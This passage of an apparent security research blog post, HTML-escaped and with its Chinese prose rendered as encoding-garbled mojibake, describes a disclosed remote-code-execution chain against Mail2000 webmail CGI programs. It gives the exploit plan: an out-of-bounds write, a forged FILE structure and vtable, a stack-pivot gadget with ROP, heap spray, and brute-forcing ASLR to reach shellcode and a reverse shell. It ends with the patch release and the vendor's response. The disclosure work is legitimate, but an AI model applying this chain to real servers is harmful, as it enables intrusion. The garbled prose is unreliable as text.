&lt;p&gt;FILE çµæ§‹æ˜¯ Linux ä¸­ç”¨ä¾†åšæª”æ¡ˆè™•ç†çš„çµæ§‹ï¼Œåƒæ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;STDIN&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;ï¼Œæˆ–è€…æ˜¯å‘¼å« &lt;code class=&quot;highlighter-rouge&quot;&gt;fopen&lt;/code&gt; å¾Œå›å‚³çš„çµæ§‹éƒ½æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE&lt;/code&gt;ã€‚è€Œé€™å€‹çµæ§‹ä¹‹æ‰€ä»¥èƒ½æˆç‚ºæ¼æ´åˆ©ç”¨çš„çªç ´å£ä¸»è¦åŸå› å°±æ˜¯å®ƒæ‰€åŒ…å«çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;vtable&lt;/code&gt; æŒ‡æ¨™ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_FILE_plus&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vtable&lt;/code&gt; ç•¶ä¸­è¨˜éŒ„äº†å„ç¨® function pointerï¼Œå°æ‡‰å„ç¨®æª”æ¡ˆè™•ç†ç›¸é—œçš„åŠŸèƒ½ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_finish_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__finish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_read_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_write_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_seek_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__seek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_close_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;å› æ­¤å¦‚æœæˆ‘å€‘å¯ä»¥ç¯¡æ”¹ã€å½é€ é€™å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;vtable&lt;/code&gt; çš„è©±ï¼Œå°±å¯ä»¥åœ¨ç¨‹å¼åšæª”æ¡ˆè™•ç†çš„æ™‚å€™ï¼ŒåŠ«æŒç¨‹å¼æµç¨‹ï¼æˆ‘å€‘å¯ä»¥ä»¥æ­¤è¨‚å‡ºä»¥ä¸‹çš„æ”»æ“Šæ­¥é©Ÿï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å»ºç«‹é€£ç·šï¼Œå‘¼å« CGI&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨å¤§é‡åƒæ•¸ï¼Œè¦†å¯« vector æŒ‡æ¨™&lt;/li&gt;
  &lt;li&gt;å½é€  POST file ç•¶ä¸­çš„ FILE*ï¼ŒæŒ‡å‘ä¸€å¡Šå½é€ çš„ FILE çµæ§‹&lt;/li&gt;
  &lt;li&gt;åœ¨ CGI æµç¨‹ä¸­å‘¼å« FILE ç›¸é—œçš„æ“ä½œ
    &lt;ul&gt;
      &lt;li&gt;fread, fwrite, fclose, â€¦&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŠ«æŒç¨‹å¼æµç¨‹&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æˆ‘å€‘ç¾åœ¨å·²ç¶“çŸ¥é“çµ‚é»æ˜¯&lt;strong&gt;å‘¼å«ä¸€å€‹ FILE æ“ä½œ&lt;/strong&gt;ï¼Œé‚£éº¼å°±å¯ä»¥é–‹å§‹å¾€å›æ‰¾&lt;strong&gt;å“ªå€‹ function&lt;/strong&gt; æ˜¯ CGI å¸¸ç”¨çš„ FILE æ“ä½œï¼Œåˆæœ‰&lt;strong&gt;å“ªä¸€äº› CGI&lt;/strong&gt; å¯ä»¥ä½œç‚ºå…¥å£é»ï¼Œæ‰èƒ½ä¸²å‡ºæˆ‘å€‘çš„æ”»æ“Šéˆï¼æˆ‘å€‘é¦–å…ˆå°ä½¿ç”¨åˆ° POST file çš„ç›¸é—œå‡½å¼åšç ”ç©¶ï¼Œä¸¦é¸å®šäº†ç›®æ¨™ &lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt;ã€‚&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; åœ¨è¨±å¤šç”¨åˆ° FILE çš„ CGI ä¸­æœ‰è¢«å‘¼å«ï¼Œå®ƒç”¨æ–¼åœ¨ç¨‹å¼çµæŸå‰å°‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;g_stCGIEnv&lt;/code&gt; æ¸…ç©ºï¼ŒåŒ…æ‹¬å°‡å‹•æ…‹é…ç½®çš„è¨˜æ†¶é«” &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; æ‰ï¼Œä»¥åŠå°‡æ‰€æœ‰ FILE é—œé–‰ï¼Œä¹Ÿå°±æ˜¯å‘¼å« &lt;code class=&quot;highlighter-rouge&quot;&gt;fclose()&lt;/code&gt;ï¼Œä¹Ÿæ„å‘³è‘—æ˜¯å¯ä»¥é€šé vtable è¢«åŠ«æŒçš„ï¼æˆ‘å€‘å¯ä»¥ä½¿ç”¨é€™å€‹è¶Šç•Œå¯«å…¥æ¼æ´è“‹æ‰ &lt;code class=&quot;highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;ï¼Œè€ŒæŒ‡å‘çš„å…§å®¹å°±æ˜¯ HTTP request çš„åƒæ•¸ï¼Œä¾¿å¯ä»¥å½é€ ç‚º POST filesï¼åƒæ˜¯ä¸‹é¢é€™å€‹çµæ§‹ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘çš„æœ€çµ‚ç›®æ¨™å°±æ˜¯å°‡ FILE* æŒ‡å‘å½é€ çš„çµæ§‹ï¼Œè—‰ç”±å½é€ çš„ vtable åŠ«æŒç¨‹å¼æµç¨‹ï¼é€™æ™‚å€™ä¾¿å‡ºç¾äº†ä¸€å€‹å•é¡Œï¼Œæˆ‘å€‘éœ€è¦å°‡ FILE* é€™å€‹æŒ‡æ¨™æŒ‡å‘ä¸€å€‹å…§å®¹å¯æ§çš„ä½ç½®ï¼Œä½†æ˜¯å…¶å¯¦æˆ‘å€‘ä¸¦ä¸çŸ¥é“è©²æŒ‡åˆ°å“ªè£¡å»ï¼Œæœƒæœ‰é€™å€‹å•é¡Œæ˜¯èµ·å› æ–¼ Linux ä¸Šçš„ä¸€å€‹é˜²ç¦¦æ©Ÿåˆ¶ - ASLRã€‚&lt;/p&gt;

&lt;h3 id=&quot;address-space-layout-randomization-aslr&quot;&gt;Address Space Layout Randomization (ASLR)&lt;/h3&gt;

&lt;p&gt;ASLR ä½¿å¾—æ¯æ¬¡ç¨‹å¼åœ¨åŸ·è¡Œä¸¦è¼‰å…¥è¨˜æ†¶é«”æ™‚ï¼Œæœƒéš¨æ©Ÿè¼‰å…¥è‡³ä¸åŒçš„è¨˜æ†¶é«”ä½ç½®ï¼Œæˆ‘å€‘å¯ä»¥å˜—è©¦ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;cat /proc/self/maps&lt;/code&gt; è§€å¯Ÿæ¯ä¸€æ¬¡åŸ·è¡Œæ™‚çš„è¨˜æ†¶é«”ä½ç½®æ˜¯å¦ç›¸åŒï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
ASLR åœ¨å¤§éƒ¨åˆ†çš„ç’°å¢ƒä¸­éƒ½æ˜¯é è¨­é–‹å•Ÿçš„ï¼Œå› æ­¤åœ¨æ’°å¯« exploit æ™‚ï¼Œå¸¸é‡åˆ°å¯ä»¥å½é€ æŒ‡æ¨™ï¼Œå»ä¸çŸ¥é“è©²æŒ‡åˆ°å“ªè£¡çš„çª˜å¢ƒã€‚&lt;br /&gt;
è€Œé€™å€‹æ©Ÿåˆ¶åœ¨ CGI çš„æ¶æ§‹ä¸‹æœƒé€ æˆæ›´å¤§çš„é˜»ç¤™ï¼Œä¸€èˆ¬çš„ä¼ºæœå™¨çš„æ”»æ“Šæµç¨‹å¯èƒ½æ˜¯é€™æ¨£ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
å¯ä»¥åœ¨ä¸€å€‹é€£ç·šç•¶ä¸­ leak address ä¸¦ç”¨ä¾†åšé€²ä¸€æ­¥çš„æ”»æ“Šï¼Œä½†åœ¨ CGI æ¶æ§‹ä¸­å»æ˜¯é€™æ¨£ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/10.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
åœ¨é€™å€‹æƒ…æ³ä¸‹ï¼Œleak å¾—åˆ°çš„ address æ˜¯ç„¡æ³•åœ¨å¾ŒçºŒæ”»æ“Šä¸­ä½¿ç”¨çš„ï¼å› ç‚º CGI åŸ·è¡Œå®Œå°±çµæŸäº†ï¼Œä¸‹ä¸€å€‹ request åˆæ˜¯å…¨æ–°çš„ CGIï¼&lt;br /&gt;
ç‚ºäº†æ‡‰å°é€™å€‹å•é¡Œï¼Œæˆ‘å€‘æœ€å¾Œå¯«äº†å…©å€‹ exploitï¼Œæ”»æ“Šçš„æ‰‹æ³•æ ¹æ“š CGI binary è€Œæœ‰ä¸åŒã€‚&lt;/p&gt;

&lt;h3 id=&quot;post-auth-rce---cgi-binmsg_read&quot;&gt;Post-Auth RCE - &lt;code class=&quot;highlighter-rouge&quot;&gt;/cgi-bin/msg_read&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;ç¬¬ä¸€å€‹ exploit çš„å…¥å£é»æ˜¯ä¸€å€‹éœ€è¦ç™»å…¥çš„é é¢ï¼Œé€™ä¸€éš»ç¨‹å¼è¼ƒå¤§ã€åŠŸèƒ½ä¹Ÿè¼ƒå¤šã€‚åœ¨é€™ä¸€å€‹ exploit ä¸­ï¼Œæˆ‘å€‘ä½¿ç”¨äº† heap spray çš„æ‰‹æ³•ä¾†å…‹æœ ASLRï¼Œä¹Ÿå°±æ˜¯åœ¨ heap ä¸­å¡«å…¥å¤§é‡é‡è¤‡çš„ç‰©ä»¶ï¼Œå¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å°±æœ‰å¾ˆé«˜çš„æ©Ÿç‡å¯ä»¥&lt;strong&gt;çŒœ&lt;/strong&gt;åˆ°å®ƒçš„ä½ç½®ã€‚&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/11.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
è€Œ spray çš„å…§å®¹å°±æ˜¯å¤§é‡å½é€ å¥½çš„ FILE çµæ§‹ï¼ŒåŒ…å«å½é€ çš„ vtableã€‚å¾é€™éš» binary ä¸­ï¼Œæˆ‘å€‘æ‰¾åˆ°äº†ä¸€å€‹ååˆ†å¯¦ç”¨çš„ &lt;strong&gt;gadget&lt;/strong&gt;ï¼Œä¹Ÿå°±æ˜¯å°ç¨‹å¼ç‰‡æ®µï¼š&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xchg eax, esp; ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;é€™å€‹ gadget çš„ä½œç”¨åœ¨æ–¼ï¼Œæˆ‘å€‘å¯ä»¥&lt;strong&gt;æ”¹è®Š stack çš„ä½ç½®&lt;/strong&gt;ï¼Œè€Œå‰›å¥½æ­¤æ™‚çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; æŒ‡å‘å…§å®¹æ˜¯å¯æ§çš„ï¼Œå› æ­¤æ•´å€‹ stack çš„å…§å®¹éƒ½å¯ä»¥å½é€ ï¼Œä¹Ÿå°±æ˜¯èªªæˆ‘å€‘å¯ä»¥ä½¿ç”¨ ROP(Return-oriented programming) ä¾†åšåˆ©ç”¨ï¼æ–¼æ˜¯æˆ‘å€‘åœ¨å½é€ çš„ vtable ä¸­è¨­ç½®äº† stack æ¬ç§»çš„ gadget ä»¥åŠå¾ŒçºŒåˆ©ç”¨çš„ ROP æ”»æ“Šéˆï¼Œé€²è¡Œ ROP æ”»æ“Šï¼&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥åš ROPï¼Œä¹Ÿå°±å¯ä»¥æ‹¿ shell äº†å°å§ï¼ä½ ä»¥ç‚ºæ˜¯é€™æ¨£å—ï¼Ÿä¸ï¼Œå…¶å¯¦é‚„æœ‰ä¸€å€‹å¤§å•é¡Œï¼ŒåŒæ¨£å°å› æ–¼å‰é¢æåˆ°çš„é˜²ç¦¦æ©Ÿåˆ¶ ASLR â€“ æˆ‘å€‘æ²’æœ‰ system çš„ä½ç½®ï¼é€™éš» binary æœ¬èº«æä¾›çš„ gadget ä¸¦ä¸è¶³ä»¥é–‹å•Ÿä¸€å€‹ shellï¼Œå› æ­¤æˆ‘å€‘å¸Œæœ›å¯ä»¥ç›´æ¥åˆ©ç”¨ libc ç•¶ä¸­çš„ system ä¾†é”æˆç›®çš„ï¼Œä½†æ­£å¦‚å‰é¢æ‰€æåˆ°çš„ï¼Œè¨˜æ†¶é«”ä½ç½®æ¯æ¬¡è¼‰å…¥éƒ½æ˜¯éš¨æ©ŸåŒ–çš„ï¼Œæˆ‘å€‘ä¸¦ä¸çŸ¥é“ system çš„ç¢ºåˆ‡ä½ç½®ï¼&lt;br /&gt;
ç¶“éæˆ‘å€‘ä»”ç´°çš„è§€å¯Ÿé€™æ”¯ç¨‹å¼ä»¥å¾Œï¼Œæˆ‘å€‘ç™¼ç¾äº†ä¸€ä»¶éå¸¸ç‰¹åˆ¥çš„äº‹ï¼Œé€™éš»ç¨‹å¼ç†è«–ä¸Šæ˜¯æœ‰æ‰“é–‹ NXï¼Œä¹Ÿå°±æ˜¯å¯å¯«æ®µä¸å¯åŸ·è¡Œçš„ä¿è­·æ©Ÿåˆ¶&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/13.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
ä½†æ˜¯å¯¦éš›åŸ·è¡Œçš„æ™‚å€™ï¼Œstack çš„åŸ·è¡Œæ¬Šé™å»æœƒè¢«æ‰“é–‹ï¼&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/14.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
ä¸è«–åŸå› ç‚ºä½•ï¼Œé€™å€‹è¨­ç½®å°é§­å®¢ä¾†èªªæ˜¯éå¸¸æ–¹ä¾¿çš„ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹å¯åŸ·è¡Œæ®µï¼Œå°‡ shellcode æ”¾ä¸Šå»åŸ·è¡Œï¼Œå°±å¯ä»¥æˆåŠŸå¾—åˆ° shellï¼Œé”æˆ RCEï¼&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œé€™å€‹æ”»æ“Šæ˜¯éœ€è¦ç™»å…¥çš„ï¼Œå°æ–¼è¿½æ±‚å®Œç¾çš„ DEVCORE ç ”ç©¶çµ„ä¾†èªªï¼Œä¸¦ä¸è¶³å¤ ï¼å› æ­¤æˆ‘å€‘æ›´é€²ä¸€æ­¥çš„ç ”ç©¶äº†å…¶å®ƒæ”»æ“Šè·¯å¾‘ï¼&lt;/p&gt;

&lt;h3 id=&quot;pre-auth-rce---cgi-bincgi_api&quot;&gt;Pre-Auth RCE - &lt;code class=&quot;highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;åœ¨æœç´¢äº†æ‰€æœ‰ CGI å…¥å£é»ä»¥å¾Œï¼Œæˆ‘å€‘æ‰¾åˆ°äº†ä¸€å€‹ä¸éœ€è¦ç™»å…¥ï¼ŒåŒæ™‚åˆæœƒå‘¼å« &lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; çš„ CGI â€“ &lt;code class=&quot;highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;ã€‚ä¸€å¦‚å…¶åï¼Œå®ƒå°±æ˜¯ä¸€éš»å‘¼å« API çš„æ¥å£ï¼Œå› æ­¤ç¨‹å¼æœ¬èº«éå¸¸çš„å°ï¼Œå¹¾ä¹æ˜¯å‘¼å«å®Œ library å°±çµæŸäº†ï¼Œä¹Ÿå› æ­¤ä¸å†æœ‰ stack pivot çš„ gadget å¯ä»¥åˆ©ç”¨ã€‚&lt;br /&gt;
é€™æ™‚ï¼Œç”±æ–¼æˆ‘å€‘å·²ç¶“å¾—çŸ¥ stack æ˜¯å¯åŸ·è¡Œçš„ï¼Œå› æ­¤å…¶å¯¦æˆ‘å€‘æ˜¯å¯ä»¥è·³é ROP é€™å€‹æ­¥é©Ÿï¼Œç›´æ¥å°‡ shellcode æ”¾ç½®åœ¨ stack ä¸Šçš„ï¼Œé€™è£¡åˆ©ç”¨åˆ°ä¸€å€‹ CGI çš„ç‰¹æ€§ â€“ HTTP çš„ç›¸é—œè®Šæ•¸æœƒæ”¾åœ¨ç’°å¢ƒè®Šæ•¸ä¸­ï¼Œåƒæ˜¯ä¸‹åˆ—é€™äº›å¸¸è¦‹è®Šæ•¸ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;HTTP_HOST&lt;/li&gt;
  &lt;li&gt;REQUEST_METHOD&lt;/li&gt;
  &lt;li&gt;QUERY_STRING&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œç’°å¢ƒè®Šæ•¸äº‹å¯¦ä¸Šå°±æ˜¯è¢«æ”¾ç½®åœ¨ stack çš„æœ€æœ«ç«¯ï¼Œä¹Ÿå°±æ˜¯å¯åŸ·è¡Œæ®µçš„ä½ç½®ï¼Œå› æ­¤æˆ‘å€‘åªè¦å½é€  vtable ç›´æ¥å‘¼å« shellcode å°±å¯ä»¥äº†ï¼&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶é€™æ™‚å€™åŒæ¨£å‡ºç¾äº†ä¸€å€‹å•é¡Œï¼šæˆ‘å€‘ä»èˆŠæ²’æœ‰ stack çš„è¨˜æ†¶é«”ä½ç½®ã€‚é€™å€‹æ™‚å€™æœ‰äº›äººå¯èƒ½æœƒé™·å…¥ä¸€å€‹è¿·æ€ï¼Œè¦ºå¾—æ”»æ“Šå°±æ˜¯è¦ä¸€æ¬¡åˆ°ä½ï¼Œåƒå€‹ç‹™æ“Šæ‰‹ä¸€æ¨£ä¸€æ“Šå¿…æ®ºï¼Œä½†å¯¦éš›ä¸Šå¯èƒ½æ˜¯é€™æ¨£æ‹¿æ©Ÿé—œæ§æŠŠæ•µäººç‚¸é£›ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191223/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ›å€‹è§’åº¦æ€è€ƒï¼Œé€™éš» binary æ˜¯ 32 bits çš„ï¼Œå› æ­¤é€™å€‹ä½ç½®æœ‰ 1.5bytes æ˜¯éš¨æ©Ÿçš„ï¼Œç¸½å…±æœ‰ 16&lt;sup&gt;3&lt;/sup&gt; å€‹å¯èƒ½çš„çµ„åˆï¼Œæ‰€ä»¥å…¶å¯¦å¹³å‡åªè¦ 4096 æ¬¡è«‹æ±‚å°±å¯ä»¥æ’åˆ°ä¸€æ¬¡ï¼é€™å°æ–¼ç¾åœ¨çš„é›»è…¦ã€ç¶²è·¯é€Ÿåº¦ä¾†èªªå…¶å¯¦ä¹Ÿå°±æ˜¯å¹¾åˆ†é˜ä¹‹é–“çš„äº‹æƒ…ï¼Œå› æ­¤ç›´æ¥åšæš´åŠ›ç ´è§£ä¹Ÿæ˜¯å¯è¡Œçš„ï¼æ–¼æ˜¯æˆ‘å€‘æœ€çµ‚çš„ exploit æµç¨‹å°±æ˜¯ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;ç™¼é€ POST è«‹æ±‚è‡³ &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;QUERY_STRING ä¸­æ”¾å…¥ shellcode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;è§¸ç™¼è¶Šç•Œå¯«å…¥ï¼Œè¦†è“‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;åœ¨è¶Šç•Œçš„åƒæ•¸æº–å‚™å½é€ çš„ FILE &amp;amp; vtable&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt; çµæŸå‰å‘¼å« &lt;code class=&quot;highlighter-rouge&quot;&gt;MCGI_VarClear&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;è·³è‡³ vtable ä¸Šçš„ shellcode ä½ç½®ï¼Œå»ºç«‹ reverse shell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘æˆåŠŸå¯«å‡ºäº†ä¸ç”¨èªè­‰çš„ RCE æ”»æ“Šéˆï¼Œä¸¦ä¸”é€™å€‹ exploit æ˜¯ä¸æœƒå› ç‚º binary çš„ç‰ˆæœ¬ä¸åŒè€Œå—å½±éŸ¿çš„ï¼è€Œåœ¨å¯¦éš›é‡åˆ°çš„æ¡ˆä¾‹ä¸­ä¹Ÿè­‰æ˜äº†é€™å€‹ exploit çš„å¯è¡Œæ€§ï¼Œæˆ‘å€‘æ›¾åœ¨ä¸€æ¬¡çš„æ¼”ç·´ç•¶ä¸­ï¼Œè—‰ç”± Mail2000 çš„é€™å€‹ 1day ä½œç‚ºçªç ´å£ï¼ŒæˆåŠŸæ´©æ¼ç›®æ¨™çš„ VPN è³‡æ–™ï¼Œé€²ä¸€æ­¥å¾€å…§ç¶²æ»²é€ï¼&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´ä¿®å¾©&quot;&gt;æ¼æ´ä¿®å¾©&lt;/h2&gt;

&lt;p&gt;æ­¤æ¼æ´å·²åœ¨ 2018/05/08 ç™¼å¸ƒçš„ Mail2000 V7 Patch 050 ç‰ˆæœ¬ä¸­å®Œæˆä¿®å¾©ã€‚Patch ç·¨è™Ÿç‚º OF-ISAC-18-002ã€OF-ISAC-18-003ã€‚&lt;/p&gt;

&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;

&lt;p&gt;æœ€å¾Œæƒ³ä¾†è«‡è«‡å°æ–¼é€™äº›æ¼æ´ï¼Œå» å•†è©²ç”¨ä»€éº¼æ¨£çš„å¿ƒæ…‹å»é¢å°ã€‚ä½œç‚ºä¸€å€‹æä¾›ç”¢å“çš„å» å•†ï¼ŒOpenfind åœ¨é€™ä¸€æ¬¡çš„æ¼æ´è™•ç†ä¸­æœ‰å¹¾å€‹é—œéµå€¼å¾—å­¸ç¿’ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å¿ƒæ…‹é–‹æ”¾
    &lt;ul&gt;
      &lt;li&gt;ä¸»å‹•æä¾›æ¸¬è©¦ç’°å¢ƒ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç©æ¥µä¿®å¾©æ¼æ´
    &lt;ul&gt;
      &lt;li&gt;é¢å°æ¼æ´ä»¥ç©æ¥µæ­£å‘çš„æ…‹åº¦ï¼Œè¿…é€Ÿè™•ç†&lt;/li&gt;
      &lt;li&gt;ä¿®å¾©å®Œç•¢å¾Œï¼Œèˆ‡æå ±è€…åˆä½œé©—è­‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é‡è¦–å®¢æˆ¶å®‰å…¨
    &lt;ul&gt;
      &lt;li&gt;ç™¼å¸ƒé‡å¤§æ›´æ–°ä¸¦ä¸»å‹•é€šå ±å®¢æˆ¶ã€å”åŠ©æ›´æ–°&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

